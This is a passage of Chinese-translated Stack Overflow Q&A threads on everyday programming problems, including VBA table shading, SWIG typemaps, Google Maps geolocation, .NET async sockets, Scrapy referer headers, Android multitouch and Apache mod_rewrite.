'
'
Dim first as Boolean
Dim tbl As Table

first = true

For Each tbl In ActiveDocument.Tables
If first Then
first = false
Else
tbl.Shading.BackgroundPatternColor = wdColorWhite
End If
Next
'ActiveDocument.Tables(1).Cell(1, 1).Shading.BackgroundPatternColor = wdColorLightTurquoise

End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-14T06:28:05.477

```
 if activedocument.Tables.Count >1   then

      for x = 2 to activedocument.Tables.Count

     activedocument.Tables(x).Shading.BackgroundPatternColor = wdColorWhite

      next x

    end if 
```

# tomcat - windows下tomcat 7下sesme服务器安装报错

> ID：14220143
> 
> 赞同：-1
> 
> 时间：2013-01-08T16:56:41.063
> 
> 标签：tomcat, sesame

我尝试在 tomcat 7 下将 sesame 作为 Web 服务安装。我将 war 文件复制到 webapps 文件夹下，然后`http://localhost:8080/openrdf-workbench`按照每个教程中的方法进行操作。问题是我收到 404 错误。任何帮助；我已经尝试了一切。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:00:29.803

为什么不通过tomcat管理器部署你的war文件

```
> http://localhost:8080/manager/html 
```

# javascript - 未捕获的类型错误：无法读取未定义的属性“纬度”

> ID：14220144
> 
> 赞同：6
> 
> 时间：2013-01-08T16:56:52.030
> 
> 标签：javascript, html, google-maps, google-maps-api-3, geolocation

大家好，我有以下代码：

```
 var map;
  var infowindow;

  function getLocation()
    {
    if (navigator.geolocation)
      {
      navigator.geolocation.getCurrentPosition(initialize);
      }
    else{x.innerHTML="Geolocation is not supported by this browser.";}
    }

  function initialize(position) {
    var pyrmont = new google.maps.LatLng(position.coords.latitude, position.coords.longitude);

    map = new google.maps.Map(document.getElementById('map'), {
      mapTypeId: google.maps.MapTypeId.ROADMAP,
      center: pyrmont,
      zoom: 15
    });

    var request = {
      location: pyrmont,
      radius: 500,
      types: ['restaurant']
    };
 ... 
```

基本上，如果我设置 Long/Lat 坐标，我可以让地图正常工作，但我希望通过获取用户位置来传递这些坐标。上面的代码显示在我的手机上，但出现以下错误：

```
TypeError: 'undefined' is not an object (evaluating 'position.coords.latitude') 
```

但在桌面上我没有得到地图和以下错误：

```
 Uncaught TypeError: Cannot read property 'latitude' of undefined 
```

任何帮助都会很棒我是 Javascript 和这些 API 的新手

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T18:33:22.727

稍后在您的代码中，在您的页面[http://markhaynes.me/mwp/addloc.html](http://markhaynes.me/mwp/addloc.html)上，您正在调用`google.maps.event.addDomListener(window, 'load', initialize);`

这会导致 Google 调用 initialize() 函数，但它会传递一个事件对象作为`position`参数，而不是您期望的位置对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T18:34:51.387

好吧，这不是地理定位 API 的问题。这是地理定位的 JSFIDDLE：http: [//jsfiddle.net/w4nvZ/3/](http://jsfiddle.net/w4nvZ/3/)

这里还有 API 的文档和示例：http: [//www.w3schools.com/html/html5_geolocation.asp](http://www.w3schools.com/html/html5_geolocation.asp)

Google 甚至有一个使用 JavaScript Google Maps API 的地理定位示例：[https ://google-developers.appspot.com/maps/documentation/javascript/examples/map-geolocation](https://google-developers.appspot.com/maps/documentation/javascript/examples/map-geolocation)

```
 var map;
function initialize() {
var mapOptions = {
zoom: 6,
mapTypeId: google.maps.MapTypeId.ROADMAP
};
map = new google.maps.Map(document.getElementById('map_canvas'),
mapOptions);
// Try HTML5 geolocation
if(navigator.geolocation) {
navigator.geolocation.getCurrentPosition(function(position) {
var pos = new google.maps.LatLng(position.coords.latitude,
position.coords.longitude);
var infowindow = new google.maps.InfoWindow({
map: map,
position: pos,
content: 'Location found using HTML5.'
});
map.setCenter(pos);
}, function() {
handleNoGeolocation(true);
});
} else {
// Browser doesn't support Geolocation
handleNoGeolocation(false);
}
}
function handleNoGeolocation(errorFlag) {
if (errorFlag) {
var content = 'Error: The Geolocation service failed.';
} else {
var content = 'Error: Your browser doesn\'t support geolocation.';
}
var options = {
map: map,
position: new google.maps.LatLng(60, 105),
content: content
};
var infowindow = new google.maps.InfoWindow(options);
map.setCenter(options.position);
}
google.maps.event.addDomListener(window, 'load', initialize); 
```

# ruby-on-rails - 终结者找不到 Rails

> ID：14220149
> 
> 赞同：1
> 
> 时间：2013-01-08T16:57:09.910
> 
> 标签：ruby-on-rails, linux, terminal, terminator

我开始使用终端模拟器 Terminator，但是当我运行 rails 应用程序时，它找不到 Rails。

```
humberto@asterix:~$ rails -v
The program 'rails' can be found in the following packages:
 * rails
 * ruby-railties-3.2
Try: sudo apt-get install <selected package> 
```

有谁知道如何解决它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:24:10.007

### 确保正确加载 RVM

我对您的终端仿真器一无所知，但您的环境可能没有经过适当修改以供 RVM 使用。确保您的 shell 获取包含以下内容的文件：

```
[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm" 
```

根据您的 shell 和模拟器，这可能是以下之一：

*   ~/.profile
*   ~/.bash_profile
*   ~/.bashrc

如果一切都失败了，只需创建一个包含必要行的 shell 脚本并将其以交互方式输入到*当前*shell 中。例如，您可以创建一个脚本，然后`source ~/bin/my_rvm_setup.sh`设置正确的环境变量和 shell 函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T06:11:54.137

您可以通过以下命令从默认 gnome 终端简单地运行 terminator：

```
terminator 
```

终结器将加载为您的默认终端定义的路径。您还可以在 .bashrc 文件上加载 RVM。为此，在您的 ~/.bashrc 文件中添加这一行：

 ``[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"``

# c++ - 具有 C++ 重载函数的 SWIG 类型映射

> ID：14220151
> 
> 赞同：4
> 
> 时间：2013-01-08T16:57:10.860
> 
> 标签：c++, overloading, swig

我有一个像这样的函数定义：

void Foo(int szData,int Data[]);

我有一个像这样的 SWIG 类型图：

```
%typemap(in) (int szData,int Data[])
{
  int i; 
  if (!PyTuple_Check($input))
  {
      PyErr_SetString(PyExc_TypeError,"Expecting a tuple for this parameter");
      $1 = 0;
  }
  else
    $1 = PyTuple_Size($input);
  $2 = (int *) malloc(($1+1)*sizeof(int));
  for (i =0; i < $1; i++)
  {
      PyObject *o = PyTuple_GetItem($input,i);
      if (!PyInt_Check(o))
      {
         free ($2);
         PyErr_SetString(PyExc_ValueError,"Expecting a tuple of integers");
         return NULL;
      }
      $2[i] = PyInt_AsLong(o);
  }
  $2[i] = 0;
} 
```

类型映射允许我像这样从 Python 调用 Foo()： Foo((1,2,3))

在我添加一个重载函数之前，这非常有效，例如： int Foo(double t);

一切都很好，但是现在当我从 Python 调用 Foo() 时，我得到：

```
NotImplementedError: Wrong number or type of arguments for overloaded function 'Foo'.
  Possible C/C++ prototypes are:
    Foo(int,int [])
    Foo(double) 
```

如果我删除 typemap(in) 那么它也可以正常工作。

欣赏是否有人有任何想法，因为我完全被难住了......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-11T04:42:37.760

重命名 SWIG 接口文件中的类型映射函数。SWIG 确实支持多态性，但在将元组与 C 类型匹配时存在问题。这是我的界面：

```
%module demo

%begin %{
#pragma warning(disable:4127 4100 4211 4706)
%}

%{
#include <iostream>
void Foo(int size, int data[]) { std::cout << __FUNCSIG__ << std::endl; }
void Foo(double d)             { std::cout << __FUNCSIG__ << std::endl; }
void Foo(int a,int b)          { std::cout << __FUNCSIG__ << std::endl; }
void Foo(int a)                { std::cout << __FUNCSIG__ << std::endl; }
%}

%typemap(in) (int szData,int Data[])
{
  int i; 
  if (!PyTuple_Check($input))
  {
      PyErr_SetString(PyExc_TypeError,"Expecting a tuple for this parameter");
      $1 = 0;
  }
  else
    $1 = (int)PyTuple_Size($input);
  $2 = (int *) malloc(($1+1)*sizeof(int));
  for (i =0; i < $1; i++)
  {
      PyObject *o = PyTuple_GetItem($input,i);
      if (!PyInt_Check(o))
      {
         free ($2);
         PyErr_SetString(PyExc_ValueError,"Expecting a tuple of integers");
         return NULL;
      }
      $2[i] = PyInt_AsLong(o);
  }
  $2[i] = 0;
}

void Foo(int a, int b);
void Foo(double d);
void Foo(int a);
%rename Foo Foot;
void Foo(int szData,int Data[]); 
```

我使用 Visual Studio 2012 构建和测试：

```
C:\Demo>swig -c++ -python demo.i && cl /nologo /LD /W4 /EHsc demo_wrap.cxx /Fe_demo.pyd /Ic:\python33\include -link /LIBPATH:c:\python33\libs && python -i demo.py
demo_wrap.cxx
   Creating library _demo.lib and object _demo.exp
>>> Foo(1)
void __cdecl Foo(int)
>>> Foo(1,1)
void __cdecl Foo(int,int)
>>> Foo(1.5)
void __cdecl Foo(double)
>>> Foot((1,2,3))
void __cdecl Foo(int,int []) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-07-24T14:40:55.103

扩展 Mark Tolonen 的答案。

您可以添加到您的`demo.i`文件中：

```
%insert("python") %{
FooOld = Foo
def Foo(arg):
  if (isinstance(arg,tuple)):
    return Foot(arg)
  else:
    return FooOld(arg)
%} 
```

你得到名称不变的多态性

# javascript - 在 JavaScript 中隐藏字符串中的某些字符

> ID：14220152
> 
> 赞同：0
> 
> 时间：2013-01-08T16:57:24.667
> 
> 标签：javascript

在我的 JavaScript 应用程序中，用户将在表单中插入他的信息。我想隐藏每个“-”或“。” 或“/”他可能会在处理他的信息之前输入。是否有任何 JavaScript 函数可以做到这一点？在我的例子中，字符串可以包含这些字符中的任何一个，全部或不包含。所以我想我不能使用替换功能。你怎么看？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:02:19.787

您可以使用该`onkeyup`事件。

```
<script type="text/javascript">
function disableSomeChars(event) {
    if (!event) {
        event = window.event;
    }
    if (
        event.keyCode === 191 // "/"
        event.keyCode === 189 // "-"
    ) {
        event.preventDefault(); // cancel the event
    }
}
</script>

<input type="text" onkeyup="disableSomeChars()" /> 
```

请记住，这还不会阻止文本的复制粘贴。要解决此问题，您可以使用(remove and ) 添加一个`onchange`清理文本字段的函数。`.replace(/[\/-]/g, "");``/``-`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T16:59:02.910

您可以在 keydown 上捕获它们。

因此，当用户在输入框中按下这些键时，您可以将它们解析出来。

# javascript - 使用 JavaScript 从 xml 文件中获取文本值？

> ID：14220161
> 
> 赞同：0
> 
> 时间：2013-01-08T16:57:42.187
> 
> 标签：javascript, xml, dom, appcelerator

我有这个 xml 文件，我想从中获取值：

```
 <test> 
        <item>
            <question audio='audio/AB2001Q.mp3' category='Alertness'>Before you make a U-turn in the road, you should</question>
            <description audio='audio/s1,1.mp3'>If you want to make a U-turn, slow down and ensure that the road is clear in both directions. Make sure that the road is wide enough to carry out the manoeuvre safely.</description>
            <image ></image>
            <answers>
                <answer title='a' audio='audio/AB2001A.mp3'>give an arm signal as well as using your indicators</answer>
                <answer title='b' audio='audio/AB2001B.mp3'>signal so that other drivers can slow down for you</answer>
                <answer title='c' audio='audio/AB2001C.mp3'>look over your shoulder for a final check</answer>
                <answer title='d' audio='audio/AB2001D.mp3'>select a higher gear than normal</answer>
            </answers>
            <correctAnswers>
                <answer>c</answer>
            </correctAnswers>
        </item>
 </test> 
```

如何获取问题音频的文本内容和问题文本，例如

“audio/AB2001Q.mp3”是问题音频

“在你掉头之前，你应该”是问题文本

这是我到目前为止所拥有的：

```
var doc = Ti.XML.parseString(blob);
var branch = doc.getElementsByTagName('item').item(0); 
```

我对 xml 很陌生！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:05:13.393

这与您在 HTML 中所做的类似，例如：

```
var branch = doc.getElementsByTagName('item')[0];
var question = branch.getElementsByTagName('question')[0];
var q1Text = question.childNodes[0].nodeValue;
var q1Audio = question.getAttribute['audio']; 
```

（如果你使用 jQuery、Sencha 或任何其他库会更容易一些）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:31:33.090

获得 Item 后，您可以使用`getAttribute('audio')`来获取该属性所代表的信息。但请记住，如果您有一个包含许多这些标签的大文件，您可能需要考虑一种不同的方法来获取数据。

# c# - 用户控件上的按钮侦听器

> ID：14220164
> 
> 赞同：1
> 
> 时间：2013-01-08T16:57:51.953
> 
> 标签：c#, xaml, user-controls, microsoft-metro, listener

这是问题所在：

我有一个带有听众的“主页按钮”

```
 private void Item_Tap(object sender, TappedRoutedEventArgs e)
    {
        if (this.Frame != null)
        {
            this.Frame.Navigate(typeof(Home));
        }
    } 
```

如果我构建了一个用户控件，使用里面的“主页按钮”，我怎样才能完成相同的导航？

**我接近解决方案**。这是用户控件：

```
public sealed partial class TopBarControl : UserControl
    {
        public Frame Frame { get; set; }
        public object Parameter { get; set; }
        public TopBarControl(Frame frame)
        {
            this.InitializeComponent();
            this.Frame = frame;
            var localSettings = Windows.Storage.ApplicationData.Current.LocalSettings;
            var dateAndTime = DateTime.Now;
            Date.Text = dateAndTime.Date.ToString("MM/dd/yyyy");
            User.Text = localSettings.Values["userName"].ToString();
            //SectionTitle.Text = Parameter.ToString();
        }

        private void GoHome_Tap(object sender, TappedRoutedEventArgs e)
        {
            if (this.Frame != null)
            {
                this.Frame.Navigate(typeof(Main_Menu));
            }
        }
    } 
```

在 xaml 用户控件上我有：

```
<Button Grid.Column="0" HorizontalAlignment="Right" BorderThickness="0">
    <Image Source="/Assets/home_icon.png" Tapped="GoHome_Tap"/>
</Button> 
```

与用户控件关联的页面

```
public WantedVehicles()
        {
            this.InitializeComponent();
        }

        private TopBarControl topBarControl;
        protected override void OnNavigatedTo(NavigationEventArgs e)
        {
            Tit.Text = e.Parameter.ToString();
            topBarControl.Frame = this.Frame;
            topBarControl.Parameter = e.Parameter;
        }

 protected override void LoadState(Object navigationParameter, Dictionary<String, Object> pageState)
        {
        }
protected override void SaveState(Dictionary<String, Object> pageState)
        {
        } 
```

但是该按钮还不起作用。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-08T21:16:45.260

我理解你的问题。这是创建主页按钮的简单方法，您可以将其添加到应用程序的任何位置，然后它会导航到主页。无需级联事件或类似的东西。只需创建一个自定义控件。**这与用户控件不同**。这只是对按钮控件进行子分类。更干净的方法。

三个简单的步骤。

注意：我的自定义控件将被称为 HomeButton，我的主页类将被称为 HomePage。除此之外，这对您来说都应该是开箱即用的。

首先，定义按钮的外观：

```
<!-- custom home button -->
<Style TargetType="local:HomeButton" BasedOn="{StaticResource BackButtonStyle}">
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="Button">
                <Grid Height="48" Width="48">
                    <Ellipse Stroke="White" StrokeThickness="2" />
                    <TextBlock Text="&#xE10F;" FontSize="20" 
                               VerticalAlignment="Center" HorizontalAlignment="Center" />
                </Grid>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style> 
```

其次，像这样定义您的自定义控件：

```
public sealed class HomeButton : Button
{
    public HomeButton()
    {
        this.DefaultStyleKey = this.GetType();
        this.Click += HomeButton_Click;
    }

    void HomeButton_Click(object sender, RoutedEventArgs e)
    {
        var _Frame = Window.Current.Content as Frame;
        var _Type = typeof(HomePage);
        _Frame.Navigate(_Type);
    }
} 
```

第三，也是最后，将主页按钮添加到您的应用中！

```
<local:HomeButton HorizontalAlignment="Left" VerticalAlignment="Top" Margin="40" /> 
```

这是它的外观：

![在此处输入图像描述](../Images/19fd29d1a8b9b93f46a1ec6000c70ee0.png)

它甚至可以工作！:) 如果您想为按钮设置更多样式，很容易在 /Common/StandardStyles.xaml 文件中窃取 BackButtonStyle 的样式。然后你可以拥有相同的视图状态和所有。无论如何，这会让你到达你想要的地方。

因此，这是解决您在问题中描述的问题的主页按钮。它甚至以比您假设的解决方案更少问题的方式解决它 - 因为跨上下文手动冒泡事件可能会导致噩梦。

我希望这有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:27:52.193

向您的用户控件添加一个按钮，并将`Item_Tap`事件处理程序附加到它。

```
<UserControl>
  ....
  <Button  Tapped="GoHome_Tap">Go Home</Button>
 .....
</UserControl> 
```

添加`Frame`到 MyUserControl.cs。请参阅您的[其他问题](https://stackoverflow.com/questions/14219989/passing-a-string-to-a-user-control/14220533)以了解如何`Frame`从封闭设置属性`Page`。

```
 public TopBarControl:UserControl
 {
    public Frame Frame {get;set;} // To be set in either OnNavigatedTo, or in Constructor. 

 } 
```

将事件处理程序添加到 MyUserControl.cs

```
private void GoHome_Tap(object sender, TappedRoutedEventArgs e)
{
    if (this.Frame != null)
    {
        this.Frame.Navigate(typeof(Home));
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:00:22.853

您必须向在按钮的事件处理程序中触发的 UserControl 添加一个事件。您在上面发布的事件仍将在您的用户控件之外定义，除非您将任何“this”传递给 UserControl 的构造函数。

# amazon-ec2 - 使用 MySQLWorkbench 连接到 EC2 SQL

> ID：14220167
> 
> 赞同：1
> 
> 时间：2013-01-08T16:58:02.217
> 
> 标签：amazon-ec2, mysql-workbench

我在 Amazon EC2 实例上有一个 MySQL 实例。我设置了必要的绑定地址，并且可以使用我的本地`PhpMyAdmin`应用程序与之同步。

但是，任何其他连接到远程服务器的方法都会失败。这包括 MySQLWorkbench、MySQL 命令行和 JDBC。

我能说的唯一区别是有一个`socket`字段`PhpMyAdmin`没有在其他任何一个字段中配置。有任何想法吗 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-09T20:17:03.537

我最终解决了它，虽然我仍然不知道问题是什么。即使`PhpMyAdmin`正在连接，它也没有做任何事情。

我在这里关注了这篇文章： [http ://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html](http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html)

并创建一个对该数据库具有权限的新用户，并将其与新用户连接。仍然没有连接到root。

此外，对于其他绊倒此的人，您可能想尝试以下方法。它更安全。 [http://masdel.wordpress.com/2012/06/13/connecting-your-toad-for-mysql-to-amazon-aws-ec2-using-ssh-tunneling/](http://masdel.wordpress.com/2012/06/13/connecting-your-toad-for-mysql-to-amazon-aws-ec2-using-ssh-tunneling/)

# c# - 如何性能调整 windows azure blob 访问

> ID：14220169
> 
> 赞同：0
> 
> 时间：2013-01-08T16:58:14.807
> 
> 标签：c#, performance, azure, azure-blob-storage

我正在使用 Windows azure blob 存储。我的问题是 blob 访问需要很长时间。我用来访问 blob 的代码如下：

```
 public void GetBlob()  // blob access
        {
            Container = BlobClient.GetContainerReference(ContainerName);

            Blob = Container.GetBlobReference(BlobName);
            try
            {
                Blob.FetchAttributes();
            }
            catch (StorageClientException)
            { Blob = null; } // blob not present
        } 
```

请建议代码是否有任何改进空间以提高性能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:03:20.683

代码很好，不应该很慢。

这段代码在哪里运行？如果它是 web/worker 角色，请确保它与 blob 存储从同一数据中心运行：西欧、北美、...

# c# - 想要一个用于传入数据的 .Net 套接字事件处理程序

> ID：14220173
> 
> 赞同：15
> 
> 时间：2013-01-08T16:58:33.543
> 
> 标签：c#, .net, sockets

我正在用 C# (.Net Framework 4.0) 重写一个古老的 VB6 程序。它与工厂车间的一台工业设备进行通信。VB6 使用了一些旧的基于 COM 的套接字软件；我正在使用 .Net Socket 类。

当我向设备发送消息时，我希望得到回复，所以我知道要听一个。但是设备也可以在没有警告的情况下**异步**发送消息（例如，指示故障或问题）。所以我**总是**必须接受那些。所以我真正想要的是一个事件处理程序，只要有任何东西从设备进来，它就会被调用。

Socket 类似乎使用 BeginReceive/EndReceive 方案来处理接收事件。我可以在我的程序开始时执行一次 BeginReceive 来为所有传入消息定义一个事件处理程序，还是我必须在整个程序中不断地执行 BeginReceive/EndReceive？

在此先感谢您阐明执行此操作的正确方法。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-01-08T17:52:17.883

你是服务员吗？

如果你是服务器，你会监听一个套接字连接，然后接受这个套接字连接并存储它。然后，您将`BeginReceive`使用存储的套接字进行调用。在该`BeginReceive`方法中，您将提供一个回调函数来接收和处理数据。

一旦你收到数据，回调就会发生。回调函数将调用`EndReceive`存储的连接。这是您获取/处理数据的地方。您还将`BeginReceive`再次调用以等待更多数据。

这样，`BeginReceive`and`EndReceive`就会循环运行：你总是在接收数据，并等待更多的数据。

[这是一个例子](http://msdn.microsoft.com/en-us/library/fx6588te.aspx)：

```
void WaitForData(SocketState state)
{
  try
  {
    state.Socket.BeginReceive(state.DataBuffer, 0, state.DataBuffer.Length, SocketFlags.None, new AsyncCallback(ReadDataCallback), state);
  }
  catch (SocketException se)
  {
    //Socket has been closed  
    //Close/dispose of socket
  }
}

public void ReadDataCallback(IAsyncResult ar)
{
  SocketState state = (SocketState)ar.AsyncState;
  try
  {
    // Read data from the client socket.
    int iRx = state.Socket.EndReceive(ar);

    //Handle Data....
    WaitForData(state);
  }
  catch (ObjectDisposedException)
  {
    //Socket has been closed  
    //Close/dispose of socket
  }
  catch (SocketException)
  {
    //Socket exception
    //Close/dispose of socket
  }
} 
```

编辑：根据您的评论，这是一个 C# 异步客户端的示例：http: [//msdn.microsoft.com/en-us/library/bbx2eya8.aspx](http://msdn.microsoft.com/en-us/library/bbx2eya8.aspx)。

`BeginReceive`/的`EndReceive`工作类似于服务器。

# python - 如何将标头添加到 Scrapy CrawlSpider 请求？

> ID：14220174
> 
> 赞同：10
> 
> 时间：2013-01-08T16:58:44.790
> 
> 标签：python, scrapy

我正在使用 CrawlSpider 类来抓取网站，并且我想修改在每个请求中发送的标头。具体来说，我想将引用者添加到请求中。

根据[这个问题](https://stackoverflow.com/questions/12054958/scrapyhow-to-print-request-referrer/12055059#12055059)，我检查了

```
response.request.headers.get('Referer', None) 
```

在我的响应解析函数中并且`Referer`标题不存在。我认为这意味着没有在请求中提交推荐人（除非网站没有返回它，我不确定）。

我无法弄清楚如何修改请求的标头。同样，我的蜘蛛是从 CrawlSpider 派生的。覆盖 CrawlSpider`_requests_to_follow`或为规则指定`process_request`回调将不起作用，因为此时引用者不在范围内。

有谁知道如何动态修改请求标头？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-01-09T10:18:31.110

您可以使用参数`REFERER`手动传递给每个[请求：](http://doc.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request)`headers`

```
yield Request(parse=..., headers={'referer':...}) 
```

RefererMiddleware[做同样的](https://github.com/scrapy/scrapy/blob/016c7e92d1d2893e7a8ce61c7f2e76818e71d019/scrapy/spidermiddlewares/referer.py#L291)事情，自动从上一个响应中获取引荐来源网址。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-01-08T18:56:56.770

我讨厌回答我自己的问题，但我发现了如何去做。您必须启用 SpiderMiddleware，它将填充引用者以获取响应。请参阅[文档](https://scrapy.readthedocs.org/en/latest/topics/spider-middleware.html#module-scrapy.contrib.spidermiddleware.referer)`scrapy.contrib.spidermiddleware.referer.RefererMiddleware`

简而言之，您需要将此中间件添加到项目的设置文件中。

```
SPIDER_MIDDLEWARES = {
'scrapy.contrib.spidermiddleware.referer.RefererMiddleware': True,
} 
```

然后在您的响应解析方法中，您可以使用`response.request.headers.get('Referrer', None)`, 来获取引用者。

如果你马上理解了这些中间件，再读一遍，休息一下，然后再读一遍。我发现它们非常令人困惑。

# javascript - 游戏地图引擎，最终幻想战术 Esk

> ID：14220176
> 
> 赞同：3
> 
> 时间：2013-01-08T16:58:50.590
> 
> 标签：javascript, game-engine

我在互联网上搜索试图找出是否有可能在 JavaScript 中构建最终幻想战术风格的世界地图引擎。地图和点的位置很简单，我仍然想知道如何在不一定笔直的点之间建立一条路径，并且精灵会沿着这条路径行走。

FFT 地图 [http://www.vintagevideogamer.net/wp-content/uploads/2012/04/world_map.jpg](http://www.vintagevideogamer.net/wp-content/uploads/2012/04/world_map.jpg)

有谁知道这种映射风格叫什么？（维基百科没有术语）

或者有没有这样的程序的现有例子？

我正在考虑使用 Canvas 或仅使用 Native JS 来尝试它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T21:57:48.777

您可以将这样的路径编码为一系列具有相对坐标的线段。假设您想要这样的路径：

```
|
\ _ 
```

其中每行是 10 个像素。您可以将其编码为线段的 javascript 数组（持续时间表示遍历该段应花费的秒数或毫秒数）：

```
[
    {"start_x":0,"start_y":0,"stop_x":0,"stop_y":10,"duration":2},
    {"start_x":0,"start_y":10,"stop_x":10,"stop_y":20,"duration":3},
    {"start_x":10,"start_y":20,"stop_x":20,"stop_y":20,"duration":2}
] 
```

然后，您只需使用时间估计来找到段开始和段结束之间的中间点。当前的偏移量为：

```
var pct_complete = elapsed_time / line_segment.duration,
    x_diff = (line_segment.stop_x - line_segment.start_x),
    y_diff = (line_segment.stop_y - line_segment.start_y),
    render_x = line_segment.start_x + (x_diff * pct_complete),
    render_y = line_segment.start_y + (y_diff * pct_complete); 
```

其中 elapsed_time 是自您开始分段以来的时间。正如我所提到的，使用相对坐标，然后您只需调整 render_x/y 以适应路径在世界中的位置和屏幕偏移。

对于更平滑的转弯，请使用较小的线段。

# java - 多点触控 [Android]

> ID：14220178
> 
> 赞同：0
> 
> 时间：2013-01-08T16:58:55.567
> 
> 标签：java, android, multi-touch

我的代码，严重简化如下：

```
 if(action == MotionEvent.ACTION_DOWN){
        x = me.getX();
        y = me.getY();
    }
    else if(action == MotionEvent.ACTION_UP){
        x = me.getX();
        y = me.getY();
    }
    else if(action == MotionEvent.ACTION_MOVE){
        x = me.getX();
        y = me.getY();
    }
    if(action == MotionEvent.ACTION_POINTER_2_DOWN){
        x2 = me.getX(1);
        y2 = me.getY(1);
    }
    if(action == MotionEvent.ACTION_POINTER_2_UP){
        x2 = me.getX(1);
        y2 = me.getY(1);
    } 
```

我想添加

```
 if(action == MotionEvent.ACTION_POINTER_2_MOVE){
        x2 = me.getX(1);
        y2 = me.getY(1);
    } 
```

但是当然

```
 MotionEvent.ACTION_POINTER_2_MOVE 
```

不是真正的方法。我知道必须有办法解决这个问题。有什么建议么？

如果您不理解我的问题，我要问的是，当指针移动时，是否有一种多点触控方法可以运行？顺便说一句，谷歌没有帮助。

我还检查了[http://developer.android.com/reference/android/view/MotionEvent.html](http://developer.android.com/reference/android/view/MotionEvent.html)但又没什么用

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:14:04.660

从文档中：

> 单个指针在运动事件中出现的顺序是未定义的。因此，指针的指针索引可以从一个事件更改为下一个事件，但只要指针保持活动状态，就可以保证指针的指针 id 保持不变。使用 getPointerId(int) 方法获取指针的指针 id，以在手势中的所有后续运动事件中跟踪它。然后对于连续的运动事件，使用 findPointerIndex(int) 方法获取该运动事件中给定指针 id 的指针索引。

您必须自己获取和跟踪指针 ID，并确定移动了哪些指针。

[http://developer.android.com/reference/android/view/MotionEvent.html](http://developer.android.com/reference/android/view/MotionEvent.html)

# php - apache mod_rewrite 和 .php 文件扩展名

> ID：14220183
> 
> 赞同：0
> 
> 时间：2013-01-08T16:59:05.967
> 
> 标签：php, apache, mod-rewrite

我在使用 mod_rewrite 时遇到问题。我有一个基本的 php 网站，其中所有文件都有 .php 扩展名。

我想要发生的是：

www.site.com/file 和 www.site.com/file/

两者都提供 www.site.com/file.php，但不显示扩展名（因此 URL 栏显示 www.site.com/file）

如果有人输入 www.site.com/file.php，它会重定向到 www.site.com/file

我的 .htaccess 代码如下：

```
Options +FollowSymLinks

RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_URI} ^(.+)/$
RewriteRule ^([^/]+)/$ /$1 [R=301,L]

RewriteCond %{THE_REQUEST} ^(.+)\.php([#?][^\ ]*)?\ HTTP/
RewriteRule ^(.+)\.php$ $1 [R=301,L]

RewriteRule ^([^/.]+)$ $1.php [L]

# Rules For file inside subfolders like
# /folder/myfile --> /folder/myfile.php
# and
# /folder/myfile/ --> /folder/myfile
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.+)/([^/]+)/$ /$1/$2 [R=301,L]
RewriteRule ^(.+)/([^/.]+)$ $1/$2.php [L] 
```

前两个（/file 和 /file/ serving file.php）工作正常，但如果我输入 www.site.com/file.php，浏览器会重定向到：

[http://www.site.com/home/siteuser/public_html/file](http://www.site.com/home/siteuser/public_html/file)

并给出 404 错误

重写日志显示以下内容（日志级别 2）：

```
[08/Jan/2013:17:35:33 +0000] [www.mysite.com/sid#b970c168][rid#b9914e08/initial] (2) [perdir /home/mysite.com/public_html/] rewrite 'about-us.php' -> 'about-us'
[08/Jan/2013:17:35:33 +0000] [www.mysite.com/sid#b970c168][rid#b9914e08/initial] (2) [perdir /home/mysite.com/public_html/] explicitly forcing redirect with http://www.mysite.com/home/mysite.com/public_html/about-us
[08/Jan/2013:17:35:33 +0000] [www.mysite.com/sid#b970c168][rid#b9914e08/initial] (1) [perdir /home/mysite.com/public_html/] escaping http://www.mysite.com/home/mysite.com/public_html/about-us for redirect
[08/Jan/2013:17:35:33 +0000] [www.mysite.com/sid#b970c168][rid#b9914e08/initial] (1) [perdir /home/mysite.com/public_html/] redirect to http://www.mysite.com/home/mysite.com/public_html/about-us [REDIRECT/301]
[08/Jan/2013:17:35:33 +0000] [www.mysite.com/sid#b970c168][rid#b9914e08/initial] (2) [perdir /home/mysite.com/public_html/] rewrite 'home/mysite.com/public_html/about-us' -> 'home/mysite.com/public_html/about-us.php'
[08/Jan/2013:17:35:33 +0000] [www.mysite.com/sid#b970c168][rid#b9914e08/initial] (2) [perdir /home/mysite.com/public_html/] strip document_root prefix: /home/mysite.com/public_html/home/mysite.com/public_html/about-us.php -> /home/mysite.com/public_html/about-us.php
